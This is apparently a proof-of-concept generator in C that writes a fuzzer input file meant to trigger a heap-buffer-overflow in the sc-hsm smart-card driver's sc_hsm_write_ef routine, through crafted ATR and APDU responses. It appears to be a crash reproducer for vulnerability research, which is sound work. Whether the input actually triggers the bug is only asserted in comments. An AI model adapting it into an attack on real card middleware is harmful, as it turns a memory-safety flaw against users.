#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Part 1: scconf profile (null-terminated)
    // Minimal profile to select sc-hsm driver
    fprintf(f, "driver = sc-hsm\n");
    fputc(0x00, f); // Null separator

    // Part 2: Reader binary data
    // Format expected by fuzzer_reader.c: ATR (length-prefixed), driver name,
    // then APDU responses. We need to craft this to make the card appear as
    // an SC-HSM and respond to SELECT FILE and UPDATE BINARY commands.

    // Write ATR for SC-HSM card (3 bytes: length, then ATR bytes)
    fputc(0x03, f); // ATR length
    fputc(0x3B, f); // ATR byte 1 (standard)
    fputc(0x00, f); // ATR byte 2
    fputc(0x00, f); // ATR byte 3

    // Write driver name as null-terminated string
    fprintf(f, "sc-hsm");
    fputc(0x00, f);

    // Write APDU responses that will be returned by the fuzzer reader
    // The fuzzer sends APDUs to the card; we provide the responses here.
    // We need to simulate a successful SELECT FILE (0x90 0x00) and
    // a successful UPDATE BINARY that triggers the overflow.

    // Response to SELECT FILE (CLA=0x00, INS=0xA4, P1=0x04, P2=0x00)
    fputc(0x90, f); // SW1
    fputc(0x00, f); // SW2

    // Response to UPDATE BINARY (CLA=0x00, INS=0xD6, P1=0x00, P2=0x00)
    // The fuzzer will send this with a large data field (32767 bytes)
    // We respond with success, and the internal processing will trigger
    // the heap-buffer-overflow in sc_hsm_write_ef
    fputc(0x90, f); // SW1
    fputc(0x00, f); // SW2

    fclose(f);
    return 0;
}